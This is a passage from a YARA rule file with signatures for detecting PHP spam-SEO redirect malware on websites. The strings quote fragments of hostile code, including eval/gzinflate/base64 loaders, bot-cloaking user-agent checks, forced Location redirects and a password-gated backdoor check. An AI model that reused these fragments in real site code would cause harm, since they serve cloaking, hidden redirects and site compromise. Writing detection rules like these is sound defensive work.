        $trigger and PR00371 and PR06710
}

private rule PR06711 : trigger
{
    strings:
        $ps0 = "<body onload=\"location[_0x"
    condition:
        $ps0
}

rule php_spamseo_redirect_055 : spamseo
{
    strings:
        $trigger = "=[\"\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\"];"
    condition:
        $trigger and PR06711
}

private rule PR06712 : trigger
{
    strings:
        $ps0 = "$res = ''"
    condition:
        $ps0
}

rule php_spamseo_redirect_056 : spamseo
{
    strings:
        $trigger = "$raw = base64_decode($encoded);"
    condition:
        $trigger and PR06712
}

private rule PR06713 : trigger
{
    strings:
        $ps0 = "--/"
    condition:
        $ps0
}

rule php_spamseo_redirect_057 : spamseo
{
    strings:
        $trigger = "exit();"
    condition:
        $trigger and PR02764 and PR06713
}

private rule PR06714 : trigger
{
    strings:
        $ps0 = ";if(!empty($R)){foreach($R as $g=>$u){if($T)$T.="
    condition:
        $ps0
}

rule php_spamseo_redirect_058 : spamseo
{
    strings:
        $trigger = "=&$_COOKIE;$"
    condition:
        $trigger and PR06714 and PR01700
}

rule php_spamseo_redirect_059 : spamseo
{
    strings:
        $trigger = "$fake_script = gen_rnd_str("
    condition:
        $trigger and PR00371
}

private rule PR06715 : trigger
{
    strings:
        $ps0 = "$host=bin2hex($_SERVER[\""
    condition:
        $ps0
}

rule php_spamseo_redirect_060 : spamseo
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR06715 and PR00719
}

private rule PR06716 : trigger
{
    strings:
        $ps0 = "echo \"Loading...please wait\";"
    condition:
        $ps0
}

private rule PR06717 : trigger
{
    strings:
        $ps0 = "header(\"Location: http://$url\");"
    condition:
        $ps0
}

rule php_spamseo_redirect_061 : spamseo
{
    strings:
        $trigger = "$url = $urls[array_rand($urls)];"
    condition:
        $trigger and PR06716 and PR06717
}

private rule PR06718 : trigger
{
    strings:
        $ps0 = "header('Location: '.trim($urls["
    condition:
        $ps0
}

private rule PR06719 : trigger
{
    strings:
        $ps0 = "shuffle($urls);"
    condition:
        $ps0
}

rule php_spamseo_redirect_062 : spamseo
{
    strings:
        $trigger = "$urls = array ("
    condition:
        $trigger and PR06718 and PR06719
}

private rule PR06720 : trigger
{
    strings:
        $ps0 = "header('Location: ' ."
    condition:
        $ps0
}

rule php_spamseo_redirect_063 : spamseo
{
    strings:
        $trigger = "$count[$browser] += $data[$browser];"
    condition:
        $trigger and PR00092 and PR06720
}

rule php_spamseo_redirect_064 : spamseo
{
    strings:
        $trigger = "$url = 'http://'.$dom[mt_rand(0,sizeof($dom)-1)]."
    condition:
        $trigger and PR00091
}

rule php_spamseo_redirect_065 : spamseo
{
    strings:
        $trigger = ".\"userid=email\".\" &&\".md5(time()).md5(time()).md5(time()).md5(time());"
    condition:
        $trigger
}

private rule PR06721 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\"0;URL='.trim($urls[rand(0,count($urls)-1)]).'\" />"
    condition:
        $ps0
}

rule php_spamseo_redirect_066 : spamseo
{
    strings:
        $trigger = "$ip.\"\\r\\n\", FILE_APPEND);"
    condition:
        $trigger and PR06721
}

private rule PR06722 : trigger
{
    strings:
        $ps0 = "stripos($_GET[\"p\"],'ugg"
    condition:
        $ps0
}

rule php_spamseo_redirect_067 : spamseo
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR06722
}

rule php_spamseo_redirect_068 : spamseo
{
    strings:
        $trigger = "+encodeURIComponent(document.referrer)+\"&default_keyword=\"+encodeURIComponent(document.title),document.currentScript?"
    condition:
        $trigger and PR00050
}

private rule PR06723 : trigger
{
    strings:
        $ps0 = "if(isgoogle() or strpos($useragent, 'google') or strpos($useragent, 'yahoo') or strpos($useragent, 'msn') or strpos($useragent, 'bing') or strpos($useragent, 'bot')){ } else { $return = true"
    condition:
        $ps0
}

private rule PR06724 : trigger
{
    strings:
        $ps0 = "echo 'AliBots WP"
    condition:
        $ps0
}

rule php_spamseo_redirect_069 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06723 and PR00070 and PR06724
}

private rule PR06725 : trigger
{
    strings:
        $ps0 = "(isset($_COOKIE["
    condition:
        $ps0
}

rule php_spamseo_redirect_070 : spamseo
{
    strings:
        $trigger = "array('\\n', '^')"
    condition:
        $trigger and PR06725 and PR01514
}

rule php_spamseo_redirect_071 : spamseo
{
    strings:
        $trigger = "function mycode($link, $red_template, $ip)"
    condition:
        $trigger and PR00203
}

private rule PR06726 : trigger
{
    strings:
        $ps0 = ";echo \"<meta http-equiv='refresh' content='0; url=$"
    condition:
        $ps0
}

rule php_spamseo_redirect_072 : spamseo
{
    strings:
        $trigger = "show_popup"
    condition:
        $trigger and PR01330 and PR06726 and PR01479
}

private rule PR06727 : trigger
{
    strings:
        $ps0 = "Google')!==false){$"
    condition:
        $ps0
}

rule php_spamseo_redirect_073 : spamseo
{
    strings:
        $trigger = "require("
    condition:
        $trigger and PR06727 and PR01746
}

private rule PR06728 : trigger
{
    strings:
        $ps0 = "[Math.floor(urls.length*Math.random())];"
    condition:
        $ps0
}

rule php_spamseo_redirect_074 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00371 and PR06728
}

rule php_spamseo_redirect_075 : spamseo
{
    strings:
        $trigger = "file_put_contents(\"ips.txt\", @file_get_contents(\"ips.txt\")"
    condition:
        $trigger and PR00091
}

private rule PR06729 : trigger
{
    strings:
        $ps0 = "sub_id_1='.strval(key($_"
    condition:
        $ps0
}

rule php_spamseo_redirect_077 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06729
}

private rule PR06730 : trigger
{
    strings:
        $ps0 = "$mykeys  = $_GET"
    condition:
        $ps0
}

private rule PR06731 : trigger
{
    strings:
        $ps0 = "if ((strpos($_SERVER[\"HTTP_REFERER\"], \"qdr:\")) OR (strpos"
    condition:
        $ps0
}

rule php_spamseo_redirect_078 : spamseo
{
    strings:
        $trigger = "else header(\"Location:"
    condition:
        $trigger and PR06730 and PR06731
}

rule php_spamseo_redirect_079 : spamseo
{
    strings:
        $trigger = "{header(\"HTTP/1.1 301\");header(\"Location"
    condition:
        $trigger
}

private rule PR06732 : trigger
{
    strings:
        $ps0 = "fwrite($fp,\"\\r\\n\".\"(\".date('D M j G:i:s T Y').\")\".$_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

rule php_spamseo_redirect_080 : spamseo
{
    strings:
        $trigger = "redirect_counter_bots.txt\",\"a+\");"
    condition:
        $trigger and PR00371 and PR06732
}

private rule PR06733 : trigger
{
    strings:
        $ps0 = "stripos($_SERVER['HTTP_USER_AGENT'], 'google')=== false) { header(\"Location"
    condition:
        $ps0
}

rule php_spamseo_redirect_081 : spamseo
{
    strings:
        $trigger = "if ((stripos($_SERVER['REQUEST_URI'], 'spy')!== false || stripos($_SERVER['REQUEST_URI'], 'monitor')!=="
    condition:
        $trigger and PR06733
}

rule php_spamseo_redirect_082 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pRj9U+O68Wc60//BZFxs35nEc"
    condition:
        $trigger
}

rule php_spamseo_redirect_083 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pRhrc6PI8bNTlf+AVcTALosQellrY3vrVrm7quyto9WmkrK9qhEM0kTAcAOS"
    condition:
        $trigger
}

private rule PR06734 : trigger
{
    strings:
        $ps0 = "$pattern='$%s=%s($%s)';"
    condition:
        $ps0
}

rule php_spamseo_redirect_084 : spamseo
{
    strings:
        $trigger = "$this->prepareDir($mimeDesc);"
    condition:
        $trigger and PR00091 and PR06734
}

private rule PR06735 : trigger
{
    strings:
        $ps0 = "setTimeout(onTimer,"
    condition:
        $ps0
}

private rule PR06736 : trigger
{
    strings:
        $ps0 = "window.location.href = 'http"
    condition:
        $ps0
}

rule php_spamseo_redirect_085 : spamseo
{
    strings:
        $trigger = "<td align=center><h1><i><font color=\"grey\">"
    condition:
        $trigger and PR02779 and PR06735 and PR06736
}

private rule PR06737 : trigger
{
    strings:
        $ps0 = "header(\"Location: \".$link.\"?\".$_SERVER['QUERY_STRING']);"
    condition:
        $ps0
}

rule php_spamseo_redirect_086 : spamseo
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR02534 and PR06737
}

private rule PR06738 : trigger
{
    strings:
        $ps0 = "ICdodHRwOi8vd3d3LnRyb3R0eXpvbmUuY29tL3dwLWNvbnRlbnQvcGx1Z2lucy"
    condition:
        $ps0
}

rule php_spamseo_redirect_087 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06738
}

rule php_spamseo_redirect_088 : spamseo
{
    strings:
        $trigger = "if(preg_match($botchar, $ua))"
    condition:
        $trigger and PR00080 and PR00113
}

private rule PR06739 : trigger
{
    strings:
        $ps0 = "echo '<script type=\"text/javascript\" src=\"'.$"
    condition:
        $ps0
}

rule php_spamseo_redirect_091 : spamseo
{
    strings:
        $trigger = "document.location.hostname\"}; </script> <script src=\"http"
    condition:
        $trigger and PR06739
}

rule php_spamseo_redirect_092 : spamseo
{
    strings:
        $trigger = "$randomlink = md5("
    condition:
        $trigger and PR00092 and PR04150
}

private rule PR06740 : trigger
{
    strings:
        $ps0 = "if(preg_match($bots_ua, $agent)"
    condition:
        $ps0
}

rule php_spamseo_redirect_093 : spamseo
{
    strings:
        $trigger = "die(\"<h1>500 Internal Server Error"
    condition:
        $trigger and PR06740 and PR00050 and PR00348
}

private rule PR06741 : trigger
{
    strings:
        $ps0 = "if(strstr($domain,'google"
    condition:
        $ps0
}

private rule PR06742 : trigger
{
    strings:
        $ps0 = "(isCrawler()&&is_home()&&!is_paged())"
    condition:
        $ps0
}

rule php_spamseo_redirect_094 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06741 and PR06742
}

private rule PR06743 : trigger
{
    strings:
        $ps0 = "header(\"Location: http://yandex.ru/yandsearch?lr=2&text=\".rand("
    condition:
        $ps0
}

private rule PR06744 : trigger
{
    strings:
        $ps0 = "if (preg_match(\"#(google"
    condition:
        $ps0
}

rule php_spamseo_redirect_095 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06743 and PR06744
}

private rule PR06745 : trigger
{
    strings:
        $ps0 = "if(document.getElementById){timer.innerHTML="
    condition:
        $ps0
}

rule php_spamseo_redirect_096 : spamseo
{
    strings:
        $trigger = "<body onLoad="
    condition:
        $trigger and PR00050 and PR00528 and PR06745
}

private rule PR06746 : trigger
{
    strings:
        $ps0 = "str_rot13(strrev('rqbprq_46rfno')); eval($"
    condition:
        $ps0
}

rule php_spamseo_redirect_097 : spamseo
{
    strings:
        $trigger = "str_rot13('tmhapbzcerff')"
    condition:
        $trigger and PR06746
}

private rule PR06747 : trigger
{
    strings:
        $ps0 = "{return true;}"
    condition:
        $ps0
}

rule php_spamseo_redirect_097_02 : spamseo
{
    strings:
        $trigger = "str_rot13('tmhapbzcerff')"
    condition:
        $trigger and PR06747 and PR06746 and PR01975
}

private rule PR06748 : trigger
{
    strings:
        $ps0 = ">window.top.location.href=\"http"
    condition:
        $ps0
}

rule php_spamseo_redirect_098 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR06748
}

private rule PR06749 : trigger
{
    strings:
        $ps0 = "@header(strrev("
    condition:
        $ps0
}

private rule PR06750 : trigger
{
    strings:
        $ps0 = "/i',$_SERVER['HTTP_USER_AGENT']) && $_COOKIE["
    condition:
        $ps0
}

rule php_spamseo_redirect_099 : spamseo
{
    strings:
        $trigger = "{@setcookie("
    condition:
        $trigger and PR06749 and PR06750
}

private rule PR06751 : trigger
{
    strings:
        $ps0 = "bin2hex($_SERVER[\"HTTP_HOST\"]);"
    condition:
        $ps0
}

private rule PR06752 : trigger
{
    strings:
        $ps0 = "sgen()"
    condition:
        $ps0
}

rule php_spamseo_redirect_100 : spamseo
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR06751 and PR06752
}

rule php_spamseo_redirect_101 : spamseo
{
    strings:
        $trigger = "$id, $matches) ) { $url_string ="
    condition:
        $trigger and PR00029 and PR01422 and PR01788
}

private rule PR06753 : trigger
{
    strings:
        $ps0 = "\"abcdefghijklmnopqrstuvwxyz\";"
    condition:
        $ps0
}

private rule PR06754 : trigger
{
    strings:
        $ps0 = "function sgen()"
    condition:
        $ps0
}

rule php_spamseo_redirect_102 : spamseo
{
    strings:
        $trigger = "header(\"Location: \".$loc);"
    condition:
        $trigger and PR06753 and PR06754
}

private rule PR06755 : trigger
{
    strings:
        $ps0 = "dns_get_record($d[$i % count($d)], DNS_TXT);"
    condition:
        $ps0
}

rule php_spamseo_redirect_103 : spamseo
{
    strings:
        $trigger = "urlencode(urldecode($_SERVER['QUERY_STRING'])), TRUE,"
    condition:
        $trigger and PR00092 and PR06755
}

rule php_spamseo_redirect_104 : spamseo
{
    strings:
        $trigger = "ZWdfbWF0Y2goJyNMb2NhdGlvblw6IChbXFNdKy"
    condition:
        $trigger and PR01398
}

rule php_spamseo_redirect_105 : spamseo
{
    strings:
        $trigger = "@header('Location:'.$f[$_GET['id']]);"
    condition:
        $trigger and PR00070
}

private rule PR06756 : trigger
{
    strings:
        $ps0 = "\\x3F\\x6B\\x65\\x79\\x3D\""
    condition:
        $ps0
}

private rule PR06757 : trigger
{
    strings:
        $ps0 = "\"\\x3B\\x20\\x70\\x61\\x74\\x68\\x3D\",\"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\",\"\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6E\\x67\""
    condition:
        $ps0
}

rule php_spamseo_redirect_106 : spamseo
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR06756 and PR06757
}

private rule PR06758 : trigger
{
    strings:
        $ps0 = "@$_SERVER[base64_decode('SFRUUF9BQ0NFUFRfTEFOR1VBR0U=')];"
    condition:
        $ps0
}

private rule PR06759 : trigger
{
    strings:
        $ps0 = "=base64_decode('Zmdj');}else{if(function_exists(base64_decode('Y3VybF9pbml0')))$"
    condition:
        $ps0
}

rule php_spamseo_redirect_107 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06758 and PR06759
}

// MANUAL FIX NECESSARY
rule php_spamseo_redirect_108 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\""
        $php_spamseo_redirect_108_r0 = /false\)[\s]*\{[\s]*header\(.Location: index\.php.\);[\s]*exit;[\s]*\}[\s]*\?>[\s]*<head><meta http-equiv=\"refresh/
    condition:
        $trigger and $php_spamseo_redirect_108_r0
}

rule php_spamseo_redirect_109 : spamseo
{
    strings:
        $trigger = ";eval (gzinflate (base64_decode (str_rot13 ("
    condition:
        $trigger
}

private rule PR06760 : trigger
{
    strings:
        $ps0 = "header('Location: index.php');"
    condition:
        $ps0
}

private rule PR06761 : trigger
{
    strings:
        $ps0 = "stripos($_SERVER['HTTP_ACCEPT_LANGUAGE'],"
    condition:
        $ps0
}

rule php_spamseo_redirect_110 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"1;URL=http"
    condition:
        $trigger and PR06760 and PR01746 and PR06761
}

private rule PR06762 : trigger
{
    strings:
        $ps0 = "function user_min_browser($agent"
    condition:
        $ps0
}

rule php_spamseo_redirect_111 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06762 and PR01431
}

rule php_spamseo_redirect_112 : spamseo
{
    strings:
        $trigger = "!empty($_SERVER[\"HTTP_USER_AGENT\"]) && !preg_match("
    condition:
        $trigger and PR00431
}

private rule PR06763 : trigger
{
    strings:
        $ps0 = "PCFET0NUWVBFIEhUTUw+DQo8aHRtbD4NCiAgICA8aGVhZD4N"
    condition:
        $ps0
}

rule php_spamseo_redirect_113 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01877 and PR06763
}

rule php_spamseo_redirect_114 : spamseo
{
    strings:
        $trigger = "$_=($__=@"
    condition:
        $trigger and PR01350
}

private rule PR06764 : trigger
{
    strings:
        $ps0 = "HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=array_pop(explode"
    condition:
        $ps0
}

rule php_spamseo_redirect_115 : spamseo
{
    strings:
        $trigger = "explode('|',$pri_addr);if($long_ip >= ip2long($start)"
    condition:
        $trigger and PR01396 and PR06764
}

// MANUAL FIX NECESSARY
rule php_spamseo_redirect_116 : spamseo
{
    strings:
        $trigger = "String.fromCharCode(71,69,84)"
        $php_spamseo_redirect_116_r0 = /new XMLHttpRequest\(\);[\s]*[\w]+\.open[\s]*\([\s]*String\.fromCharCode\(71,69,84\)[^}]+responseText;\}/
    condition:
        $trigger and $php_spamseo_redirect_116_r0
}

rule php_spamseo_redirect_117 : spamseo
{
    strings:
        $trigger = "{die(\"writing\\n\");}fwrite($fp,$data);fclose($fp);}function xor_enc"
    condition:
        $trigger and PR01330 and PR01479
}

private rule PR06765 : trigger
{
    strings:
        $ps0 = "file_get_contents($file_pointer);"
    condition:
        $ps0
}

rule php_spamseo_redirect_118 : spamseo
{
    strings:
        $trigger = "=\"RewriteCond %{HTTP_USER_AGENT} Googlebot"
    condition:
        $trigger and PR06765 and PR00124
}

private rule PR06766 : trigger
{
    strings:
        $ps0 = ")||stristr(@$_SERVER[\"HTTP_REFERER\"],\"google"
    condition:
        $ps0
}

rule php_spamseo_redirect_119 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06766 and PR00070
}

private rule PR06767 : trigger
{
    strings:
        $ps0 = ".php\");exit;}"
    condition:
        $ps0
}

rule php_spamseo_redirect_120 : spamseo
{
    strings:
        $trigger = "echo $file;"
    condition:
        $trigger and PR00070 and PR06767
}

private rule PR06768 : trigger
{
    strings:
        $ps0 = "if (strpos($_SERVER['REQUEST_URI'], '.html') !== false)"
    condition:
        $ps0
}

rule php_spamseo_redirect_121 : spamseo
{
    strings:
        $trigger = "301 Moved Permanently"
    condition:
        $trigger and PR06768 and PR05438
}

rule php_spamseo_redirect_122 : spamseo
{
    strings:
        $trigger = "(preg_match(\"/(\".$white_engine_search.\")/i\""
    condition:
        $trigger and PR00391 and PR01514
}

private rule PR06769 : trigger
{
    strings:
        $ps0 = "location:http"
    condition:
        $ps0
}

private rule PR06770 : trigger
{
    strings:
        $ps0 = "(strpos($tmp,"
    condition:
        $ps0
}

rule php_spamseo_redirect_123 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06769 and PR06770 and PR04816
}

private rule PR06771 : trigger
{
    strings:
        $ps0 = "if((strpos($tmp, 'bot"
    condition:
        $ps0
}

rule php_spamseo_redirect_124 : spamseo
{
    strings:
        $trigger = "$tmp = \"?\" . strtolower($_SERVER['HTTP_USER_AGENT']);"
    condition:
        $trigger and PR06771
}

private rule PR06772 : trigger
{
    strings:
        $ps0 = "if(!preg_match('/bot/',@$_SERVER['HTTP_USER_AGENT']) && preg_match"
    condition:
        $ps0
}

rule php_spamseo_redirect_125 : spamseo
{
    strings:
        $trigger = "{die(\"<html><head><script>document.cookie="
    condition:
        $trigger and PR06772 and PR00265
}

rule php_spamseo_redirect_126 : spamseo
{
    strings:
        $trigger = "NfZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRVZVhwbG9pVCkpKSk7CmV4aXQ7"
    condition:
        $trigger and PR01398
}

private rule PR06773 : trigger
{
    strings:
        $ps0 = "google|bing|yandex"
    condition:
        $ps0
}

rule php_spamseo_redirect_128 : spamseo
{
    strings:
        $trigger = "header(\"Location: http"
    condition:
        $trigger and PR06773 and PR05438
}

rule php_spamseo_redirect_129 : spamseo
{
    strings:
        $trigger = "()==false){@header(\"Location: https://bit.ly"
    condition:
        $trigger and PR00092
}

private rule PR06774 : trigger
{
    strings:
        $ps0 = "$url = xor_string($url, $key);"
    condition:
        $ps0
}

rule php_spamseo_redirect_130 : spamseo
{
    strings:
        $trigger = "gzuncompress"
    condition:
        $trigger and PR06774
}

rule php_spamseo_redirect_131 : spamseo
{
    strings:
        $trigger = "ICAgICAgICAgIGhlYWRlcigiTG9jYXRpb246ICRyZWRpclRvIik7CiAgICAgICAgICAgIGRpZTsKICAgICAgICB9CiAgICB9Cn0="
    condition:
        $trigger and PR01398
}

rule php_spamseo_redirect_132 : spamseo
{
    strings:
        $trigger = "(strpos ($ref, 'google') !=="
    condition:
        $trigger and PR02741 and PR05438
}

private rule PR06775 : trigger
{
    strings:
        $ps0 = "HTTP/1.1 302 Found"
    condition:
        $ps0
}

private rule PR06776 : trigger
{
    strings:
        $ps0 = "gethostbyaddr($_SERVER["
    condition:
        $ps0
}

rule php_spamseo_redirect_134 : spamseo
{
    strings:
        $trigger = "(strripos($"
    condition:
        $trigger and PR06775 and PR00273 and PR06776
}

private rule PR06777 : trigger
{
    strings:
        $ps0 = ")#i',@$_SERVER['HTTP_REFERER'])"
    condition:
        $ps0
}

rule php_spamseo_redirect_135 : spamseo
{
    strings:
        $trigger = "if(!preg_match('/bot/',@$_SERVER['HTTP_USER_AGENT']) &&"
    condition:
        $trigger and PR06777
}

private rule PR06778 : trigger
{
    strings:
        $ps0 = "fwrite($fh,\"$rec: $ip#$host#$browser\\r\\n\");"
    condition:
        $ps0
}

rule php_spamseo_redirect_136 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06778
}

private rule PR06779 : trigger
{
    strings:
        $ps0 = "if(isset($_GET['kokki']))"
    condition:
        $ps0
}

rule php_spamseo_redirect_137 : spamseo
{
    strings:
        $trigger = "header('location:"
    condition:
        $trigger and PR06779
}

rule php_spamseo_redirect_138 : spamseo
{
    strings:
        $trigger = "foreach(explode('|', $words) as $word) {"
    condition:
        $trigger and PR00080 and PR00273 and PR00113
}

rule php_spamseo_redirect_139 : spamseo
{
    strings:
        $trigger = "HN0cmlwb3MoJF9TRVJWRVJb"
    condition:
        $trigger and PR01398
}

private rule PR06780 : trigger
{
    strings:
        $ps0 = ".substr(md5(strtolower($"
    condition:
        $ps0
}

rule php_spamseo_redirect_140 : spamseo
{
    strings:
        $trigger = "array(base64_decode(str_replace("
    condition:
        $trigger and PR00092 and PR06755 and PR06780
}

// MANUAL FIX NECESSARY
private rule PR06781 : trigger
{
    strings:
        $ps0 = "301 Moved Permanently"
    condition:
        $ps0
}

rule php_spamseo_redirect_141 : spamseo
{
    strings:
        $trigger = "eader('Location: "
        $php_spamseo_redirect_141_r0 = /<\?php[\s]*header\(.HTTP[^;]+Moved Permanently.\);[\s]*header\(.Location:[\s]*http[^\)]+\.(su|ru)..\);[\s]*exit;[\s]*\/\*/
    condition:
        $trigger and PR06781 and $php_spamseo_redirect_141_r0
}

private rule PR06782 : trigger
{
    strings:
        $ps0 = "window.location='http"
    condition:
        $ps0
}

private rule PR06783 : trigger
{
    strings:
        $ps0 = "</script><?}"
    condition:
        $ps0
}

rule php_spamseo_redirect_142 : spamseo
{
    strings:
        $trigger = "<? $m = $_REQUEST[\"m\"]; if($m==\"d\"){?>"
    condition:
        $trigger and PR00050 and PR06782 and PR06783
}

rule php_spamseo_redirect_143 : spamseo
{
    strings:
        $trigger = "')>-1 || $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']==1 || $_COOKIE['"
    condition:
        $trigger and PR05438
}

private rule PR06784 : trigger
{
    strings:
        $ps0 = "$domain = substr(strrchr($email, \"@\"), 1);"
    condition:
        $ps0
}

rule php_spamseo_redirect_144 : spamseo
{
    strings:
        $trigger = "{ header( \"Location: http://$domain\" );"
    condition:
        $trigger and PR00301 and PR06784
}

rule php_spamseo_redirect_145 : spamseo
{
    strings:
        $trigger = "$payload = json_decode($_POST['data'], true);"
    condition:
        $trigger
}

rule php_spamseo_redirect_146 : spamseo
{
    strings:
        $trigger = "doc[loc] = \"<?php echo $l; ?>\";"
    condition:
        $trigger and PR00042 and PR00630
}

rule php_spamseo_redirect_147 : spamseo
{
    strings:
        $trigger = "toppillcaremarket.com"
    condition:
        $trigger and PR02764
}

private rule PR06785 : trigger
{
    strings:
        $ps0 = "window.onload"
    condition:
        $ps0
}

private rule PR06786 : trigger
{
    strings:
        $ps0 = "Math.round(Math.random() * 9);"
    condition:
        $ps0
}

rule php_spamseo_redirect_148 : spamseo
{
    strings:
        $trigger = "location.href = url"
    condition:
        $trigger and PR06785 and PR06786 and PR00050
}

rule php_spamseo_redirect_149 : spamseo
{
    strings:
        $trigger = "{ header('Location: http"
    condition:
        $trigger and PR04434
}

private rule PR06787 : trigger
{
    strings:
        $ps0 = "chr(104).chr(101).chr(97).chr(100).chr(101).chr(114);"
    condition:
        $ps0
}

private rule PR06788 : trigger
{
    strings:
        $ps0 = "(base64_decode('TG9jYXRpb246IA==').chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr("
    condition:
        $ps0
}

rule php_spamseo_redirect_150 : spamseo
{
    strings:
        $trigger = "));die();"
    condition:
        $trigger and PR06787 and PR06788
}

private rule PR06789 : trigger
{
    strings:
        $ps0 = "md5(@$_GET['pass'])=="
    condition:
        $ps0
}

private rule PR06790 : trigger
{
    strings:
        $ps0 = "($function){if($safe_mode=ini_get('safe_mode')&&strtolower($safe_mode)!='off')return false;"
    condition:
        $ps0
}

rule php_spamseo_redirect_151 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03580 and PR06789 and PR00431 and PR06790
}

private rule PR06791 : trigger
{
    strings:
        $ps0 = "}.PHP_EOL;}else if(stristr(@"
    condition:
        $ps0
}

private rule PR06792 : trigger
{
    strings:
        $ps0 = ");exit;}else{ header"
    condition:
        $ps0
}

private rule PR06793 : trigger
{
    strings:
        $ps0 = ");define('BASE_PATH',str_ireplace($_SERVER["
    condition:
        $ps0
}

rule php_spamseo_redirect_152 : spamseo
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR06791 and PR06792 and PR01021 and PR06793 and PR01431
}

// MANUAL FIX NECESSARY
rule php_spamseo_redirect_153 : spamseo
{
    strings:
        $trigger = "$GLOBALS["
        $php_spamseo_redirect_153_r0 = /\], true, 404\);\s*print (\$\w+\[\d+\]\.)+\$\w+\[\d+\];\s*\}/
    condition:
        $trigger and $php_spamseo_redirect_153_r0
}

private rule PR06794 : trigger
{
    strings:
        $ps0 = "(int)round("
    condition:
        $ps0
}

private rule PR06795 : trigger
{
    strings:
        $ps0 = "<?php class _"
    condition:
        $ps0
}

private rule PR06796 : trigger
{
    strings:
        $ps0 = "();endif;"
    condition:
        $ps0
}

private rule PR06797 : trigger
{
    strings:
        $ps0 = ")||$GLOBALS["
    condition:
        $ps0
}

rule php_spamseo_redirect_154 : spamseo
{
    strings:
        $trigger = "dEc"
    condition:
        $trigger and PR06794 and PR00091 and PR06795 and PR06796 and PR06797
}

private rule PR06798 : trigger
{
    strings:
        $ps0 = "xVztjhzHdf0tA36HEbHG7iK7p"
    condition:
        $ps0
}

rule php_spamseo_redirect_156 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06798
}

private rule PR06799 : trigger
{
    strings:
        $ps0 = "echo \"<!DOCTYPE html><iframe src=\\\"https://{$target}\\\" style="
    condition:
        $ps0
}

rule php_spamseo_redirect_157 : spamseo
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06799
}

private rule PR06800 : trigger
{
    strings:
        $ps0 = "print '<script language=\"javascript\">window.location = \"'"
    condition:
        $ps0
}

rule php_spamseo_redirect_158 : spamseo
{
    strings:
        $trigger = "(':', '', 'aH:R0:"
    condition:
        $trigger and PR06800
}

private rule PR06801 : trigger
{
    strings:
        $ps0 = "].\"\\x"
    condition:
        $ps0
}

private rule PR06802 : trigger
{
    strings:
        $ps0 = "(0);/*$"
    condition:
        $ps0
}

private rule PR06803 : trigger
{
    strings:
        $ps0 = "*/($"
    condition:
        $ps0
}

private rule PR06804 : trigger
{
    strings:
        $ps0 = "*/eval/*$"
    condition:
        $ps0
}

rule php_spamseo_redirect_159 : spamseo
{
    strings:
        $trigger = ".\"\\x72\"."
    condition:
        $trigger and PR06801 and PR06802 and PR06803 and PR06804
}

private rule PR06805 : trigger
{
    strings:
        $ps0 = "];if(isset($_GET[$_GET{"
    condition:
        $ps0
}

private rule PR06806 : trigger
{
    strings:
        $ps0 = "});$jump_url=$jummp_domain;$_GET{"
    condition:
        $ps0
}

rule php_spamseo_redirect_160 : spamseo
{
    strings:
        $trigger = "<?php define"
    condition:
        $trigger and PR06805 and PR00675 and PR06806
}

private rule PR06807 : trigger
{
    strings:
        $ps0 = "!==false){@header($"
    condition:
        $ps0
}

rule php_spamseo_redirect_161 : spamseo
{
    strings:
        $trigger = "\"])&&isset($_REQUEST[\"\\x70\\x61\\x74\\x68\"])&&isset($_REQUEST[\"\\x"
    condition:
        $trigger and PR06807 and PR00029
}

private rule PR06808 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_URL, $HTTP_Server);"
    condition:
        $ps0
}

private rule PR06809 : trigger
{
    strings:
        $ps0 = "$url.$_SERVER[\"REQUEST_URI\"];"
    condition:
        $ps0
}

private rule PR06810 : trigger
{
    strings:
        $ps0 = "header('Location:'.$"
    condition:
        $ps0
}

rule php_spamseo_redirect_162 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR06808 and PR01428 and PR01021 and PR06809 and PR06810
}

rule php_spamseo_redirect_163 : spamseo
{
    strings:
        $trigger = "/utr64_new.php?j=\" . urlencode($_REQUEST['j']));"
    condition:
        $trigger and PR00507
}

rule php_spamseo_redirect_gen_001 : spamseo
{
    strings:
